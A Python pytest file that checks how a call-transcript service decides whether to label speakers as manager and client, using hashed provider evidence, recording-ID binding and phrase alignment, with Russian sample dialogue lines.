from __future__ import annotations

import json

import pytest

from mango_mvp.services import dialogue_contract as contract
from tests import mango_provider_fixture as fx


SOURCE_CALL_ID = fx.SOURCE_CALL_ID
RECORDING_ID = fx.RECORDING_ID
PROVEN_MAPPING = dict(fx.PROVEN_ROLE_MAPPING)
# (provider role, physical track, text) — one source for the stored dialogue and
# for the official answer, so a fixture cannot prove something the API never
# said.  The official envelope has no per-phrase channel and no start time.
PROVEN_TURNS = fx.DEFAULT_TURNS
PROVEN_PHRASES = [
    {"role": role, "text": text} for role, _side, text in PROVEN_TURNS
]
raw_sha = fx.raw_sha


def evidence(**overrides):
    """Valid evidence first, then a patch breaks exactly one field.

    Nothing is derived from the patch: a broken field must reach the production
    guard, not blow up while the fixture is still being assembled.
    """
    return fx.evidence(PROVEN_TURNS, **overrides)


def call(variants, **overrides):
    payload = {
        "id": 7,
        "source_call_id": SOURCE_CALL_ID,
        "source_recording_id": RECORDING_ID,
        "transcript_variants_json": json.dumps(variants, ensure_ascii=False),
        "transcript_text": "",
    }
    payload.update(overrides)
    return payload


def stereo(status="unverified_low_evidence", topology="simple_two_party", **mapping):
    role_mapping = {
        "status": status,
        "confirmed": status == "confirmed_multi_signal",
        "manager_quality_allowed": status == "confirmed_multi_signal",
        "topology": topology,
        "left": "manager",
        "right": "client",
    }
    role_mapping.update(mapping)
    payload = {
        "mode": "stereo",
        "role_mapping": role_mapping,
        "dialogue_lines": fx.dialogue_lines(PROVEN_TURNS),
    }
    return payload


def trusted_variants(**mapping):
    variants = stereo("confirmed_multi_signal", **mapping)
    variants[contract.PROVIDER_EVIDENCE_FIELD] = evidence()
    return variants


TOPOLOGIES = {
    # Text-derived confirmation is the live production case and is not proof.
    "stereo_text_confirmed": stereo("confirmed_multi_signal"),
    "stereo_unverified": stereo(),
    "stereo_model_correction": stereo("model_speaker_correction"),
    "transfer": stereo("blocked_complex_call", topology="transfer"),
    "conference": stereo("blocked_complex_call", topology="conference_or_multi_party"),
    "echo": stereo("blocked_complex_call", topology="echo_or_duplicate_channels"),
    "mono": {
        "mode": "mono_or_fallback",
        "role_mapping": {
            "status": "unverified_mono_or_legacy",
            "confirmed": False,
            "topology": "mono_or_unknown",
            "manager_quality_allowed": False,
        },
        "dialogue_lines": [
            "[00:01.0] Спикер (не определен): Добрый день",
            "[00:03.0] Спикер (не определен): Здравствуйте",
        ],
    },
    "mono_leaked_role_labels": {
        "mode": "mono_or_fallback",
        "role_mapping": {"status": "unverified_mono_or_legacy", "confirmed": False},
        "dialogue_lines": [
            "[00:01.0] Менеджер (Иван): Добрый день",
            "[00:03.0] Клиент: Здравствуйте",
        ],
    },
    "unknown_speaker_label": {
        "mode": "stereo",
        "role_mapping": dict(PROVEN_MAPPING),
        "dialogue_lines": [
            "[00:01.0] Спикер 1: Добрый день",
            "[00:03.0] Спикер 2: Здравствуйте",
        ],
    },
}


@pytest.mark.parametrize("name", sorted(TOPOLOGIES))
def test_every_topology_keeps_all_turns_and_never_claims_a_role(name):
    dialogue = contract.build_dialogue_input(call(TOPOLOGIES[name]))
    rendered = dialogue.render()

    assert dialogue.source == contract.SOURCE_DIALOGUE_LINES
    assert [turn["turn_id"] for turn in dialogue.turns] == ["T0001", "T0002"]
    assert "Добрый день" in rendered and "Здравствуйте" in rendered
    assert dialogue.role_attribution["decision"] == "untrusted"
    assert dialogue.role_attribution["trusted"] is False
    assert dialogue.needs_review is True
    assert "Менеджер" not in rendered and "Клиент" not in rendered
    assert {turn["display_speaker"] for turn in dialogue.turns} <= {
        "Спикер A", "Спикер B", "Не определено",
    }


def test_reason_codes_stay_inside_the_closed_versioned_list():
    for variants in TOPOLOGIES.values():
        dialogue = contract.build_dialogue_input(call(variants))
        attribution = dialogue.role_attribution
        assert attribution["version"] == contract.ROLE_GUARD_VERSION
        assert set(attribution["reason_codes"]) <= contract.ROLE_REASON_CODES
        assert attribution["reason_codes"] == sorted(attribution["reason_codes"])
        assert dialogue.warnings == tuple(attribution["reason_codes"])


def test_every_reason_code_has_one_russian_sentence():
    assert set(contract.ROLE_REASON_RU) == set(contract.ROLE_REASON_CODES)
    assert all(sentence.strip() for sentence in contract.ROLE_REASON_RU.values())


def test_text_derived_confirmation_alone_is_untrusted_for_the_missing_evidence_reason():
    attribution = contract.build_dialogue_input(
        call(stereo("confirmed_multi_signal"))
    ).role_attribution
    assert attribution["reason_codes"] == ["provider_evidence_missing"]


# --- Neutral but distinguishable speakers ----------------------------------


def test_known_production_labels_stay_distinguishable_without_becoming_roles():
    dialogue = contract.build_dialogue_input(call(TOPOLOGIES["mono_leaked_role_labels"]))

    # The reader can still tell the two people apart — but not who they are.
    assert [turn["display_speaker"] for turn in dialogue.turns] == [
        "Спикер A", "Спикер B",
    ]
    assert [turn["text"] for turn in dialogue.turns] == ["Добрый день", "Здравствуйте"]
    assert "Менеджер" not in dialogue.render() and "Клиент" not in dialogue.render()
    assert dialogue.role_attribution["trusted"] is False


def test_a_genuinely_unknown_speaker_is_not_given_a_letter_it_did_not_earn():
    """Two ``Спикер 1``/``Спикер 2`` lines prove nothing about two people."""
    dialogue = contract.build_dialogue_input(call(TOPOLOGIES["unknown_speaker_label"]))

    assert [turn["display_speaker"] for turn in dialogue.turns] == [
        "Не определено", "Не определено",
    ]
    assert len(dialogue.turns) == 2
    assert "unknown_speaker_label" in dialogue.role_attribution["reason_codes"]


def test_a_mono_recording_stays_undefined_instead_of_inventing_two_speakers():
    dialogue = contract.build_dialogue_input(call(TOPOLOGIES["mono"]))

    assert [turn["display_speaker"] for turn in dialogue.turns] == [
        "Не определено", "Не определено",
    ]
    assert "mono_or_unknown" in dialogue.role_attribution["reason_codes"]


def test_the_left_track_is_always_speaker_a_even_when_only_the_right_one_spoke():
    variants = stereo()
    variants["dialogue_lines"] = ["[00:01.0] Дорожка правая: Только клиент"]
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.turns[0]["display_speaker"] == "Спикер B"


# --- Provider evidence ------------------------------------------------------


def test_provider_evidence_unlocks_manager_and_client():
    dialogue = contract.build_dialogue_input(call(trusted_variants()))

    attribution = dict(dialogue.role_attribution)
    alignment_report = attribution.pop("provider_alignment")
    assert attribution == {
        "version": contract.ROLE_GUARD_VERSION,
        "decision": "trusted",
        "trusted": True,
        "topology": "simple_two_party",
        "reason_codes": [],
        "source": contract.SOURCE_DIALOGUE_LINES,
    }
    assert alignment_report["alignment"] == {"operator": "left", "client": "right"}
    assert alignment_report["reason"] is None
    assert alignment_report["best"]["min_substantial_turn_coverage"] == 1.0
    assert dialogue.needs_review is False
    assert [turn["speaker_kind"] for turn in dialogue.turns] == ["manager", "client"]
    assert dialogue.render() == (
        "[00:01.0] Менеджер: Добрый день\n[00:03.0] Клиент: Здравствуйте"
    )


def test_provider_evidence_uses_the_proven_side_and_not_the_channel_order():
    """The client can sit on the left track; only the words decide."""
    inverted = (
        ("client", "left", "Добрый день"),
        ("operator", "right", "Здравствуйте"),
    )
    variants = stereo("confirmed_multi_signal", left="client", right="manager")
    variants[contract.PROVIDER_EVIDENCE_FIELD] = fx.evidence(inverted)
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["trusted"] is True
    assert dialogue.render() == (
        "[00:01.0] Клиент: Добрый день\n[00:03.0] Менеджер: Здравствуйте"
    )


def test_provider_alignment_tolerates_realistic_asr_and_segmentation_differences():
    provider_turns = (
        ("operator", "left", "Добрый день, меня зовут Анна. Расскажу про летнюю школу"),
        ("client", "right", "Здравствуйте! Нам нужна математика для восьмого класса"),
    )
    variants = stereo("confirmed_multi_signal")
    variants["dialogue_lines"] = [
        "[00:01.0] Дорожка левая: Добрый день меня зовут Ана",
        "[00:02.0] Дорожка левая: расскажу про летнюю школу",
        "[00:03.0] Дорожка правая: Здравствуйте нам нужна математика для 8 класса",
    ]
    variants[contract.PROVIDER_EVIDENCE_FIELD] = fx.evidence(provider_turns)

    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.trusted is True
    assert [turn["speaker_kind"] for turn in dialogue.turns] == [
        "manager", "manager", "client",
    ]


def test_provider_alignment_rejects_reordered_cross_side_replies():
    provider_turns = (
        ("operator", "left", "Расскажу про программу обучения"),
        ("client", "right", "Сначала уточню стоимость курса"),
        ("operator", "left", "После этого отправлю расписание"),
        ("client", "right", "Хорошо, буду ждать материалы"),
    )
    variants = stereo("confirmed_multi_signal")
    variants["dialogue_lines"] = fx.dialogue_lines(
        (provider_turns[0], provider_turns[2], provider_turns[1], provider_turns[3])
    )
    variants[contract.PROVIDER_EVIDENCE_FIELD] = fx.evidence(provider_turns)

    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.trusted is False
    assert dialogue.role_attribution["reason_codes"] == [
        "provider_evidence_dialogue_mismatch"
    ]
    assert (
        dialogue.role_attribution["provider_alignment"]["best"]
        ["role_run_sequence_equal"]
        is False
    )


def test_provider_alignment_rejects_reordered_replies_on_the_same_side():
    provider_turns = (
        ("operator", "left", "Сначала расскажу про программу обучения"),
        ("operator", "left", "Затем отправлю расписание и договор"),
        ("client", "right", "Хорошо, буду ждать материалы"),
    )
    variants = stereo("confirmed_multi_signal")
    variants["dialogue_lines"] = fx.dialogue_lines(
        (provider_turns[1], provider_turns[0], provider_turns[2])
    )
    variants[contract.PROVIDER_EVIDENCE_FIELD] = fx.evidence(provider_turns)

    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.trusted is False
    assert dialogue.role_attribution["reason_codes"] == [
        "provider_evidence_dialogue_mismatch"
    ]
    assert (
        dialogue.role_attribution["provider_alignment"]["best"]
        ["min_side_order_score"]
        < contract.PROVIDER_ALIGNMENT_MIN_SIDE_SCORE
    )


def test_provider_alignment_handles_long_repetitive_tracks():
    manager = " ".join(["отправлю договор сегодня"] * 800)
    client = " ".join(["нужна математика девятый класс"] * 800)
    report = contract.provider_side_alignment_report(
        [
            {"role": "operator", "text": manager},
            {"role": "client", "text": client},
        ],
        [
            {"side": "left", "text": manager},
            {"side": "right", "text": client},
        ],
    )

    assert report["alignment"] == {"operator": "left", "client": "right"}
    assert report["reason"] is None


def test_one_invented_turn_cannot_hide_inside_a_long_matching_call():
    provider_turns = tuple(
        (
            "operator" if index % 2 else "client",
            "left" if index % 2 else "right",
            (
                f"Менеджер объясняет расписание и программу номер {index}"
                if index % 2
                else f"Клиент задаёт вопрос о математике номер {index}"
            ),
        )
        for index in range(1, 21)
    )
    variants = stereo("confirmed_multi_signal")
    variants["dialogue_lines"] = [
        *fx.dialogue_lines(provider_turns),
        "[00:45.0] Дорожка правая: Я уже оплатил курс полностью",
    ]
    variants[contract.PROVIDER_EVIDENCE_FIELD] = fx.evidence(provider_turns)

    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.trusted is False
    assert dialogue.role_attribution["reason_codes"] == [
        "provider_evidence_dialogue_mismatch"
    ]
    report = dialogue.role_attribution["provider_alignment"]
    assert report["best"]["min_substantial_turn_coverage"] < (
        contract.PROVIDER_ALIGNMENT_MIN_TURN_COVERAGE
    )
    # The calibration telemetry contains only numbers and fixed technical keys.
    assert "оплатил" not in json.dumps(report, ensure_ascii=False)


def test_one_missing_short_provider_reply_removes_role_trust():
    provider_turns = (
        ("operator", "left", "Подробно расскажу про программу и расписание занятий"),
        ("client", "right", "Нет"),
        ("client", "right", "Мне нужна математика для восьмого класса вечером"),
    )
    variants = stereo("confirmed_multi_signal")
    variants["dialogue_lines"] = fx.dialogue_lines(
        (provider_turns[0], provider_turns[2])
    )
    variants[contract.PROVIDER_EVIDENCE_FIELD] = fx.evidence(provider_turns)

    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.trusted is False
    assert dialogue.role_attribution["reason_codes"] == [
        "provider_evidence_dialogue_mismatch"
    ]
    assert (
        dialogue.role_attribution["provider_alignment"]["best"]
        ["min_provider_phrase_coverage"]
        == 0.0
    )


def test_one_short_reply_cannot_reuse_a_token_from_a_later_turn():
    provider_turns = (
        ("operator", "left", "Расскажу про программу обучения"),
        ("client", "right", "Нет"),
        ("client", "right", "Мне нужна математика, но вечером времени нет"),
    )
    variants = stereo("confirmed_multi_signal")
    variants["dialogue_lines"] = fx.dialogue_lines(
        (provider_turns[0], provider_turns[2])
    )
    variants[contract.PROVIDER_EVIDENCE_FIELD] = fx.evidence(provider_turns)

    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.trusted is False
    assert dialogue.role_attribution["provider_alignment"]["best"][
        "min_short_phrase_exact_match"
    ] == 0.0


def test_provider_alignment_does_not_guess_when_both_assignments_are_close():
    ambiguous = (
        ("operator", "left", "Да хорошо"),
        ("client", "right", "Да хорошо"),
    )
    variants = stereo("confirmed_multi_signal")
    variants["dialogue_lines"] = [
        "[00:01.0] Дорожка левая: Да хорошо",
        "[00:02.0] Дорожка правая: Да хорошо",
    ]
    variants[contract.PROVIDER_EVIDENCE_FIELD] = fx.evidence(ambiguous)

    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.trusted is False
    assert dialogue.role_attribution["reason_codes"] == [
        "provider_evidence_ambiguous_sides"
    ]


@pytest.mark.parametrize(
    ("patch", "code"),
    [
        ({"provider": "other"}, "provider_evidence_invalid"),
        ({"source_call_id": "call-999"}, "provider_evidence_call_mismatch"),
        ({"source_call_id": ""}, "provider_evidence_call_mismatch"),
        ({"recording_id": "rec-999"}, "provider_recording_binding_mismatch"),
        ({"recording_id": ""}, "provider_evidence_invalid"),
        ({"raw_response_sha256": "short"}, "provider_evidence_invalid"),
        ({"raw_response_sha256": "b" * 64}, "provider_evidence_invalid"),
        ({"raw_response": None}, "provider_evidence_invalid"),
        ({"raw_response": ""}, "provider_evidence_invalid"),
        ({"raw_response": "не json"}, "provider_evidence_invalid"),
        ({"phrases_sha256": "b" * 64}, "provider_evidence_invalid"),
        ({"batch_response_sha256": None}, "provider_evidence_invalid"),
        # A bare phrase list is exactly the shape that could not be bound to a
        # recording, so it is no longer a body the guard will read.
        ({"raw_response": json.dumps({"phrases": PROVEN_PHRASES}, ensure_ascii=False)},
         "provider_evidence_invalid"),
    ],
)
def test_broken_provider_evidence_never_unlocks_roles(patch, code):
    variants = stereo("confirmed_multi_signal")
    variants[contract.PROVIDER_EVIDENCE_FIELD] = evidence(**patch)
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["trusted"] is False
    assert code in dialogue.role_attribution["reason_codes"]
    assert "Менеджер" not in dialogue.render()


def test_provider_evidence_needs_an_independent_source_recording_binding():
    variants = trusted_variants()
    missing = contract.build_dialogue_input(call(variants, source_recording_id=""))
    mismatched = contract.build_dialogue_input(
        call(variants, source_recording_id="rec-other")
    )

    assert missing.role_attribution["reason_codes"] == [
        "provider_recording_binding_missing"
    ]
    assert mismatched.role_attribution["reason_codes"] == [
        "provider_recording_binding_mismatch"
    ]


def test_mutable_variants_cannot_rebind_evidence_to_another_recording():
    variants = trusted_variants()
    variants[contract.SOURCE_RECORDING_ID_FIELD] = RECORDING_ID

    dialogue = contract.build_dialogue_input(
        call(variants, source_recording_id="rec-independent")
    )

    assert dialogue.trusted is False
    assert "provider_recording_binding_mismatch" in dialogue.warnings


@pytest.mark.parametrize(
    "channels",
    [
        None,
        {},
        {"left": "operator"},
        {"left": "client", "right": "operator"},
        {"left": "operator", "right": "operator"},
        "operator_left",
    ],
)
def test_a_leftover_channels_field_is_never_read_as_a_side_binding(channels):
    """The sides are derived from the words; a stray echo field changes nothing.

    Inverting a stored ``channels`` value used to be enough to swap Менеджер and
    Клиент.  The field is no longer written and no longer read — an old sidecar
    that still carries it must not move a single side.
    """
    variants = stereo("confirmed_multi_signal")
    variants[contract.PROVIDER_EVIDENCE_FIELD] = evidence(channels=channels)
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["trusted"] is True
    assert dialogue.render().startswith("[00:01.0] Менеджер: Добрый день")


@pytest.mark.parametrize(
    "phrases",
    [
        None,
        [],
        [{"role": "client", "text": "Добрый день"},
         {"role": "operator", "text": "Здравствуйте"}],
    ],
)
def test_a_leftover_phrases_field_is_never_read_instead_of_the_body(phrases):
    """The canonical phrases are re-derived from the raw body, never copied."""
    variants = stereo("confirmed_multi_signal")
    variants[contract.PROVIDER_EVIDENCE_FIELD] = evidence(phrases=phrases)
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["trusted"] is True
    assert dialogue.render().startswith("[00:01.0] Менеджер: Добрый день")


@pytest.mark.parametrize(
    ("raw_evidence", "code"),
    [
        (None, "provider_evidence_missing"),
        ({}, "provider_evidence_missing"),
        ("confirmed", "provider_evidence_invalid"),
        ({"provider": "mango_office", "recording_id": RECORDING_ID},
         "provider_evidence_call_mismatch"),
    ],
)
def test_absent_or_self_declared_provider_evidence_stays_untrusted(raw_evidence, code):
    variants = stereo("confirmed_multi_signal")
    if raw_evidence is not None:
        variants[contract.PROVIDER_EVIDENCE_FIELD] = raw_evidence
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["trusted"] is False
    assert code in dialogue.role_attribution["reason_codes"]


def test_a_tampered_raw_response_never_unlocks_roles():
    swapped = tuple(
        ("client" if role == "operator" else "operator", side, text)
        for role, side, text in PROVEN_TURNS
    )
    tampered = json.dumps(fx.envelope(fx.record(swapped)), ensure_ascii=False)
    variants = stereo("confirmed_multi_signal")
    # The body hash is recomputed, so the evidence is internally consistent —
    # and still worthless, because the phrases digest no longer matches it.
    variants[contract.PROVIDER_EVIDENCE_FIELD] = evidence(
        raw_response=tampered, raw_response_sha256=raw_sha(tampered)
    )
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["reason_codes"] == ["provider_evidence_invalid"]
    assert "Менеджер" not in dialogue.render()


def test_our_invented_envelope_shape_is_no_longer_accepted_as_proof():
    """`names` as a list of speaker records with a channel was our invention.

    It could declare which physical track each side sat on — a claim the
    documented answer never makes.  A fully self-consistent evidence built on
    that shape must prove nothing.
    """
    invented = json.dumps(
        {
            "result": 1000,
            "data": {
                "recording_id": RECORDING_ID,
                "names": [
                    {"name": "Оператор", "role": "operator", "channel": "left"},
                    {"name": "Клиент", "role": "client", "channel": "right"},
                ],
                "phrases": [
                    {"name": "Оператор", "start": 1.0, "text": "Добрый день"},
                    {"name": "Клиент", "start": 3.0, "text": "Здравствуйте"},
                ],
            },
        },
        ensure_ascii=False,
    )
    variants = stereo("confirmed_multi_signal")
    variants[contract.PROVIDER_EVIDENCE_FIELD] = evidence(
        raw_response=invented, raw_response_sha256=raw_sha(invented)
    )
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["reason_codes"] == ["provider_evidence_invalid"]
    assert "Менеджер" not in dialogue.render()


def test_a_batch_answer_binds_only_the_recording_the_evidence_names():
    """One answer may describe many recordings; the right one is extracted."""
    other = fx.record(
        (("operator", "left", "Чужой звонок"), ("client", "right", "Ага")),
        recording_id="rec-8",
    )
    body = json.dumps(
        fx.envelope(other, fx.record(PROVEN_TURNS)), ensure_ascii=False
    )
    variants = stereo("confirmed_multi_signal")
    variants[contract.PROVIDER_EVIDENCE_FIELD] = evidence(
        raw_response=body, raw_response_sha256=raw_sha(body)
    )
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["trusted"] is True
    assert dialogue.render().startswith("[00:01.0] Менеджер: Добрый день")


def test_an_answer_without_the_named_recording_is_refused():
    body = json.dumps(
        fx.envelope(fx.record(PROVEN_TURNS, recording_id="rec-8")), ensure_ascii=False
    )
    variants = stereo("confirmed_multi_signal")
    variants[contract.PROVIDER_EVIDENCE_FIELD] = evidence(
        raw_response=body, raw_response_sha256=raw_sha(body)
    )
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["reason_codes"] == ["provider_evidence_invalid"]


def test_an_internal_call_is_refused_with_its_own_reason():
    body = json.dumps(
        fx.envelope(fx.record(PROVEN_TURNS, operator="Иванов", client="Иванов")),
        ensure_ascii=False,
    )
    variants = stereo("confirmed_multi_signal")
    variants[contract.PROVIDER_EVIDENCE_FIELD] = evidence(
        phrases_sha256=contract.canonical_provider_phrases_sha256(PROVEN_PHRASES),
        raw_response=body,
        raw_response_sha256=raw_sha(body),
    )
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["reason_codes"] == [
        "provider_evidence_internal_call"
    ]
    assert "Менеджер" not in dialogue.render()


def test_two_tracks_with_the_same_words_are_ambiguous_and_never_named():
    same = (("operator", "left", "Алло"), ("client", "right", "Алло"))
    variants = stereo("confirmed_multi_signal")
    variants["dialogue_lines"] = fx.dialogue_lines(same)
    variants[contract.PROVIDER_EVIDENCE_FIELD] = fx.evidence(same)
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["reason_codes"] == [
        "provider_evidence_ambiguous_sides"
    ]
    assert "Менеджер" not in dialogue.render()


def test_a_self_declared_hash_without_the_body_never_unlocks_roles():
    variants = stereo("confirmed_multi_signal")
    payload = evidence()
    payload.pop("raw_response")
    variants[contract.PROVIDER_EVIDENCE_FIELD] = payload
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["reason_codes"] == ["provider_evidence_invalid"]


def test_evidence_of_another_call_cannot_be_reused():
    dialogue = contract.build_dialogue_input(
        call(trusted_variants(), source_call_id="call-8")
    )
    assert dialogue.role_attribution["reason_codes"] == [
        "provider_evidence_call_mismatch"
    ]


def test_a_one_sided_recording_has_no_binding_to_derive():
    """Only one track spoke: there is no second side to bind a role to."""
    one_sided = (
        ("operator", "left", "Добрый день"),
        ("operator", "left", "Вы меня слышите?"),
    )
    variants = stereo("confirmed_multi_signal")
    variants["dialogue_lines"] = fx.dialogue_lines(one_sided)
    variants[contract.PROVIDER_EVIDENCE_FIELD] = fx.evidence(one_sided)
    dialogue = contract.build_dialogue_input(call(variants))

    assert dialogue.role_attribution["reason_codes"] == [
        "provider_evidence_no_channel_binding"
    ]
    assert "Менеджер" not in dialogue.render()


@pytest.mark.parametrize(
    ("lines", "expected_code"),
    [
        (["[00:01.0] Дорожка левая: Совсем другой текст",
          "[00:03.0] Дорожка правая: Здравствуйте"],
         "provider_evidence_dialogue_mismatch"),
        (["[00:01.0] Дорожка правая: Добрый день",
          "[00:03.0] Дорожка левая: Здравствуйте"],
         "provider_evidence_dialogue_mismatch"),
        (["[00:01.0] Дорожка левая: Добрый день"],
         "provider_evidence_no_channel_binding"),
        (["[00:01.0] Дорожка левая: Добрый день",
          "[00:03.0] Дорожка правая: Здравствуйте",
          "[00:05.0] Дорожка левая: Ещё одна реплика"],
         "provider_evidence_dialogue_mismatch"),
    ],
)
def test_evidence_that_does_not_describe_this_dialogue_is_refused(lines, expected_code):
    variants = trusted_variants()
    variants["dialogue_lines"] = lines
    dialogue = contract.build_dialogue_input(call(variants))

    assert expected_code in dialogue.role_attribution["reason_codes"]
    assert "Менеджер" not in dialogue.render()


@pytest.mark.parametrize(
    ("broken", "code"),
    [
        ({"confirmed": "true"}, "role_mapping_not_confirmed"),
        ({"manager_quality_allowed": False}, "manager_quality_not_allowed"),
        ({"topology": "uncertain"}, "unsupported_topology"),
        ({"left": "manager", "right": "manager"}, "invalid_channel_mapping"),
        ({"status": "unverified_after_secondary_backfill"}, "role_mapping_status_not_allowed"),
    ],
)
def test_each_broken_role_mapping_field_removes_trust(broken, code):
    variants = trusted_variants()
    variants["role_mapping"].update(broken)
    attribution = contract.build_dialogue_input(call(variants)).role_attribution

    assert attribution["trusted"] is False
    assert code in attribution["reason_codes"]


def test_missing_role_mapping_and_mono_mode_are_untrusted():
    missing = contract.build_dialogue_input(
        call({"mode": "stereo", "dialogue_lines": ["[00:01.0] Дорожка левая: Текст"]})
    ).role_attribution
    mono = contract.build_dialogue_input(call(TOPOLOGIES["mono"])).role_attribution

    assert missing["reason_codes"] == ["provider_evidence_missing", "role_mapping_missing"]
    assert "mono_or_unknown" in mono["reason_codes"]


# --- One source line is one turn --------------------------------------------


def test_neighbouring_turns_of_one_channel_are_never_merged():
    """Этап C has to quote an exact turn_id with its own timecode."""
    variants = stereo()
    variants["dialogue_lines"] = [
        "[00:01.0] Дорожка левая: Добрый день",
        "[00:02.0] Дорожка левая: представлюсь",
        "[00:03.0] Дорожка правая: Здравствуйте",
    ]
    dialogue = contract.build_dialogue_input(call(variants))

    assert [turn["turn_id"] for turn in dialogue.turns] == ["T0001", "T0002", "T0003"]
    assert [turn["timecode"] for turn in dialogue.turns] == [
        "[00:01.0]", "[00:02.0]", "[00:03.0]",
    ]
    assert dialogue.render() == (
        "[00:01.0] Спикер A: Добрый день\n"
        "[00:02.0] Спикер A: представлюсь\n"
        "[00:03.0] Спикер B: Здравствуйте"
    )


def test_different_speakers_are_never_merged_even_on_the_same_timecode():
    variants = stereo()
    variants["dialogue_lines"] = [
        "[00:01.0] Дорожка правая: Сначала клиент",
        "[00:01.0] Дорожка левая: Потом менеджер",
        "[00:01.0] Дорожка правая: Снова клиент",
    ]
    dialogue = contract.build_dialogue_input(call(variants))

    assert [turn["display_speaker"] for turn in dialogue.turns] == [
        "Спикер B", "Спикер A", "Спикер B",
    ]
    assert [turn["text"] for turn in dialogue.turns] == [
        "Сначала клиент", "Потом менеджер", "Снова клиент",
    ]


def test_two_identical_unknown_labels_keep_their_own_turn_and_timecode():
    dialogue = contract.build_dialogue_input(call(TOPOLOGIES["mono"]))

    assert [turn["turn_id"] for turn in dialogue.turns] == ["T0001", "T0002"]
    assert [turn["timecode"] for turn in dialogue.turns] == ["[00:01.0]", "[00:03.0]"]


def test_an_unknown_label_downgrades_even_fully_proven_evidence():
    variants = trusted_variants()
    variants["dialogue_lines"] = [
        "[00:01.0] Дорожка левая: Добрый день",
        "[00:03.0] Спикер 2: Здравствуйте",
    ]
    dialogue = contract.build_dialogue_input(call(variants))

    assert "unknown_speaker_label" in dialogue.role_attribution["reason_codes"]
    assert "Менеджер" not in dialogue.render()
    assert [turn["display_speaker"] for turn in dialogue.turns] == [
        "Спикер A", "Не определено",
    ]


def test_untrusted_role_label_is_not_translated_into_a_physical_side():
    variants = stereo(left="client", right="manager")
    variants["dialogue_lines"] = [
        "[00:01.0] Менеджер (Иван): Добрый день",
        "[00:03.0] Дорожка левая: Здравствуйте",
    ]
    dialogue = contract.build_dialogue_input(call(variants))

    assert [turn["physical_side"] for turn in dialogue.turns] == ["", "left"]
    assert "missing_physical_binding" in dialogue.role_attribution["reason_codes"]
    # The label is distinguishable but unbound: it gets its own letter after the
    # two reserved physical ones, and never the side the mapping would suggest.
    assert dialogue.render() == (
        "[00:01.0] Спикер C: Добрый день\n[00:03.0] Спикер A: Здравствуйте"
    )


def test_an_untrusted_role_label_is_never_merged_into_the_physical_track():
    variants = stereo()
    variants["dialogue_lines"] = [
        "[00:01.0] Дорожка левая: Первая",
        "[00:02.0] Менеджер: Вторая",
        "[00:03.0] Дорожка левая: Третья",
    ]
    dialogue = contract.build_dialogue_input(call(variants))

    assert [turn["turn_id"] for turn in dialogue.turns] == ["T0001", "T0002", "T0003"]
    assert [turn["timecode"] for turn in dialogue.turns] == [
        "[00:01.0]", "[00:02.0]", "[00:03.0]",
    ]
    assert [turn["text"] for turn in dialogue.turns] == ["Первая", "Вторая", "Третья"]


LEGACY_ROLE_LINES = [
    "[00:01.0] Менеджер (Иван): Добрый день",
    "[00:03.0] Клиент: Здравствуйте",
]


def test_a_legacy_role_label_without_a_stored_side_stays_unbound():
    variants = trusted_variants()
    variants["dialogue_lines"] = list(LEGACY_ROLE_LINES)
    dialogue = contract.build_dialogue_input(call(variants))

    # No physical side is bound, so the provider evidence cannot be matched to
    # the stored lines and trust is refused even though the labels look right.
    assert dialogue.role_attribution["trusted"] is False
    assert "missing_physical_binding" in dialogue.role_attribution["reason_codes"]
    assert "Менеджер" not in dialogue.render()


def test_a_legacy_role_label_recovers_its_side_only_from_the_stored_channel():
    """ТЗ-01 R1: the side comes from what the producer stored, not from the word."""
    variants = trusted_variants()
    variants["dialogue_lines"] = list(LEGACY_ROLE_LINES)
    variants["manager"] = {"physical_channel": "left"}
    variants["client"] = {"physical_channel": "right"}
    dialogue = contract.build_dialogue_input(call(variants))

    assert [turn["physical_side"] for turn in dialogue.turns] == ["left", "right"]
    assert dialogue.role_attribution["trusted"] is True
    assert dialogue.render() == (
        "[00:01.0] Менеджер: Добрый день\n[00:03.0] Клиент: Здравствуйте"
    )


@pytest.mark.parametrize(
    ("manager_block", "client_block"),
    [
        ({"physical_channel": "left"}, {"physical_channel": "left"}),
        ({"physical_channel": "mono"}, {"physical_channel": "right"}),
        ({"physical_channel": ""}, {"physical_channel": "right"}),
        ({"physical_channel": "left"}, {}),
        ({"physical_channel": "left"}, "right"),
        # Contradicts ``role_mapping``, which says left is the manager.
        ({"physical_channel": "right"}, {"physical_channel": "left"}),
    ],
)
def test_a_broken_or_contradicting_stored_channel_never_recovers_a_side(
    manager_block, client_block
):
    variants = trusted_variants()
    variants["dialogue_lines"] = list(LEGACY_ROLE_LINES)
    variants["manager"] = manager_block
    variants["client"] = client_block
    dialogue = contract.build_dialogue_input(call(variants))

    assert [turn["physical_side"] for turn in dialogue.turns] == ["", ""]
    assert "missing_physical_binding" in dialogue.role_attribution["reason_codes"]
    assert "Менеджер" not in dialogue.render()


# --- Line grammar -----------------------------------------------------------


@pytest.mark.parametrize(
    ("line", "start_sec"),
    [
        ("[00:01.5] Дорожка левая: Текст", 1.5),
        ("[~00:05] Дорожка левая: Текст", 5.0),
        ("[01:02:03.5] Дорожка левая: Текст", 3723.5),
    ],
)
def test_timecode_grammar_is_parsed_and_preserved(line, start_sec):
    variants = stereo()
    variants["dialogue_lines"] = [line]
    turn = contract.build_dialogue_input(call(variants)).turns[0]

    assert turn["start_sec"] == start_sec
